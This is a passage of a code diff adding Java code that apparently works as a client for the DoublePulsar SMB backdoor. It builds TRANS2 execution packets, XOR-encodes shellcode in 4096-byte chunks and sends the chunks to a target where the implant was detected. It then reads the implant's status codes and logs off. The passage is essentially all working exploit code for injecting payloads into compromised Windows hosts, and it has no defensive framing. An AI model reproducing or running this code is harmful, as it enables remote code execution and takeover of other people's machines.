+                byte[] byteCount = ByteBuffer.allocate(2)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putShort((short) (4096 + 12)) //changed from 12 ???
+                        .array();
+
+                // Update packet fields
+                dopuExecPacket[39] = totalDataCount[0];
+                dopuExecPacket[40] = totalDataCount[1];
+
+                dopuExecPacket[59] = dataCount[0];
+                dopuExecPacket[60] = dataCount[1];
+
+                dopuExecPacket[67] = byteCount[0];
+                dopuExecPacket[68] = byteCount[1];
+
+                /* =========================
+                 * Tree ID + User ID
+                 * ========================= */
+
+                //dopuExecPacket[28] = treeId[0];
+                //dopuExecPacket[29] = treeId[1];
+
+                //dopuExecPacket[32] = userId[0];
+                //dopuExecPacket[33] = userId[1];
+
+                dopuExecPacket[28] = treeConnectResponse[28];
+                dopuExecPacket[29] = treeConnectResponse[29];
+
+                dopuExecPacket[32] = sessionSetupResponse[32];
+                dopuExecPacket[33] = sessionSetupResponse[33];
+
+                byte[] sendPacket = new byte[dopuExecPacket.length + xorParameters.length + 4096];
+
+                System.arraycopy(xorBytes, ctx, currentChunk, 0, 4096);
+
+                System.arraycopy(dopuExecPacket, 0, sendPacket, 0, dopuExecPacket.length);
+                System.arraycopy(xorParameters, 0, sendPacket, dopuExecPacket.length, xorParameters.length);
+                System.arraycopy(currentChunk, 0, sendPacket, dopuExecPacket.length + xorParameters.length, currentChunk.length);
+
+                /* =========================
+                 * Send packet
+                 * ========================= */
+                out.write(sendPacket);
+                int respLen = in.read(smbResponse);
+
+
+                /* =========================
+                 * Status checks
+                 * ========================= */
+
+                if ((smbResponse[9]) == 0x02 &&
+                        (smbResponse[10] & 0xFF) == 0x00 &&
+                        (smbResponse[11] & 0xFF) == 0x00 &&
+                        (smbResponse[12] & 0xFF) == 0xC0) {
+
+                    System.out.println("DOPU returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!");
+                }
+
+                if ((smbResponse[34] & 0xFF) == 82) {
+                    System.out.println("DOPU returned:  Success!");
+                } else if ((smbResponse[34] & 0xFF) == 98) {
+                    System.out.println("DOPU returned:  Invalid parameters!");
+                } else if ((smbResponse[34] & 0xFF) == 114) {
+                    System.out.println("DOPU returned:  Allocation failure!");
+                } else {
+                    System.out.println("DOPU didn't succeed");
+                }
+
+                bytesLeft -= 4096;
+                ctx += 4096;
+                OffsetofChunkinPayload += 4096;
             }
+
+            // handle remainder
+            if (remainder > 0) {
+                System.out.println("Last packet!");
+
+                /* =========================
+                 * Build parameters
+                 * ========================= */
+
+                // Pack values as little-endian uint32
+                byte[] entireSize = ByteBuffer.allocate(4)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putInt(payload_totalsize)
+                        .array();
+
+                byte[] chunkSize = ByteBuffer.allocate(4)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putInt(remainder)
+                        .array();
+
+                byte[] offset = ByteBuffer.allocate(4)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putInt(OffsetofChunkinPayload)
+                        .array();
+
+                /* =========================
+                 * Concatenate parameters
+                 * ========================= */
+
+                System.arraycopy(entireSize, 0, parameters, 0, 4);
+                System.arraycopy(chunkSize, 0, parameters, 4, 4);
+                System.arraycopy(offset, 0, parameters, 8, 4);
+                //hexdump(parameters, 16);
+
+                /* =========================
+                 * XOR parameters
+                 * ========================= */
+
+                xorParameters = byteXor(parameters, key);
+                //hexdump(xorParameters, 16);
+
+                //send SMB packet here
+                /* =========================
+                 * Append parameters + payload
+                 * ========================= */
+
+                /* =========================
+                 * Build TRANS2 exec packet
+                 * ========================= */
+
+                //implementation 2
+                /* Generate Doublepulsar Execution Packet */
+
+                int trans2PacketLen = dopuExecPacket.length;
+                System.out.printf("Total size of SMB packet:  %d%n", trans2PacketLen);
+
+                int packetLen = trans2PacketLen + remainder + 12;
+                System.out.printf("Total size of SMB packet & shellcode:  %d%n", packetLen);
+
+                System.out.println("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet");
+
+                mergedPacketLen = trans2PacketLen + remainder + 12 - 4;
+                System.out.printf("UPDATED:  Total size of SMB packet & shellcode:  %d%n", mergedPacketLen);
+
+                /* =========================
+                 * Update SMB length (big endian)
+                 * ========================= */
+
+                byte[] smbLength = ByteBuffer.allocate(2)
+                        .order(ByteOrder.BIG_ENDIAN)
+                        .putShort((short) mergedPacketLen)
+                        .array();
+
+                dopuExecPacket[2] = smbLength[0];
+                dopuExecPacket[3] = smbLength[1];
+
+                /* =========================
+                 * Data counts (little endian)
+                 * ========================= */
+
+                byte[] totalDataCount = ByteBuffer.allocate(2)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putShort((short) remainder)
+                        .array();
+
+                byte[] dataCount = ByteBuffer.allocate(2)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putShort((short) remainder)
+                        .array();
+
+                byte[] byteCount = ByteBuffer.allocate(2)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putShort((short) (remainder + 12)) //changed from 12 ???
+                        .array();
+
+                // Update packet fields
+                dopuExecPacket[39] = totalDataCount[0];
+                dopuExecPacket[40] = totalDataCount[1];
+
+                dopuExecPacket[59] = dataCount[0];
+                dopuExecPacket[60] = dataCount[1];
+
+                dopuExecPacket[67] = byteCount[0];
+                dopuExecPacket[68] = byteCount[1];
+
+                /* =========================
+                 * Tree ID + User ID
+                 * ========================= */
+
+                //dopuExecPacket[28] = treeId[0];
+                //dopuExecPacket[29] = treeId[1];
+
+                //dopuExecPacket[32] = userId[0];
+                //dopuExecPacket[33] = userId[1];
+
+                dopuExecPacket[28] = treeConnectResponse[28];
+                dopuExecPacket[29] = treeConnectResponse[29];
+
+                dopuExecPacket[32] = sessionSetupResponse[32];
+                dopuExecPacket[33] = sessionSetupResponse[33];
+
+                byte[] finalPacket = new byte[dopuExecPacket.length + xorParameters.length + remainder];
+                byte[] lastBytes = new byte[remainder];
+
+                System.arraycopy(xorBytes, ctx, lastBytes, 0, remainder);
+
+                System.arraycopy(dopuExecPacket, 0, finalPacket, 0, dopuExecPacket.length);
+                System.arraycopy(xorParameters, 0, finalPacket, dopuExecPacket.length, xorParameters.length);
+                System.arraycopy(lastBytes, 0, finalPacket, dopuExecPacket.length + xorParameters.length, lastBytes.length);
+
+                System.out.println("Total Length of the final hex packet " + finalPacket.length);
+
+                /* =========================
+                 * Send packet
+                 * ========================= */
+                System.out.println("Sending the packet");
+                out.write(finalPacket);
+                int respLen = in.read(LastsmbResponse);
+                bytesLeft -= remainder;
+
+                /* =========================
+                 * Status checks
+                 * ========================= */
+                System.out.println("Reading the SMB response...");
+                if ((LastsmbResponse[9]) == 0x02 &&
+                        (LastsmbResponse[10] & 0xFF) == 0x00 &&
+                        (LastsmbResponse[11] & 0xFF) == 0x00 &&
+                        (LastsmbResponse[12] & 0xFF) == 0xC0) {
+
+                    System.out.println("DOPU returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!");
+                }
+
+                if ((LastsmbResponse[34] & 0xFF) == 82) {
+                    System.out.println("DOPU returned:  Success!");
+                } else if ((LastsmbResponse[34] & 0xFF) == 98) {
+                    System.out.println("DOPU returned:  Invalid parameters!");
+                } else if ((LastsmbResponse[34] & 0xFF) == 114) {
+                    System.out.println("DOPU returned:  Allocation failure!");
+                } else {
+                    System.out.println("DOPU didn't succeed");
+                }
+            }
+
+            /* =========================
+             * Tree disconnect
+             * ========================= */
+
+            byte[] treeDisconnect = hexToBytes("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000");
+
+            treeDisconnect[28] = treeConnectResponse[28];
+            treeDisconnect[29] = treeConnectResponse[29];
+
+            treeDisconnect[32] = sessionSetupResponse[32];
+            treeDisconnect[33] = sessionSetupResponse[33];
+
+            out.write(treeDisconnect);
+            in.read(smbResponse);
+
+            /* =========================
+             * Logoff
+             * ========================= */
+
+            byte[] logoff = hexToBytes("00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000");
+
+            logoff[28] = treeConnectResponse[28];
+            logoff[29] = treeConnectResponse[29];
+
+            logoff[32] = sessionSetupResponse[32];
+            logoff[33] = sessionSetupResponse[33];
+
+            out.write(logoff);
+            in.read(LastsmbResponse);
+
+            socket.close();
+        } else {
+            System.out.print("No DoublePulsar detected!\n");
+            socket.close();
         }
     }
 }
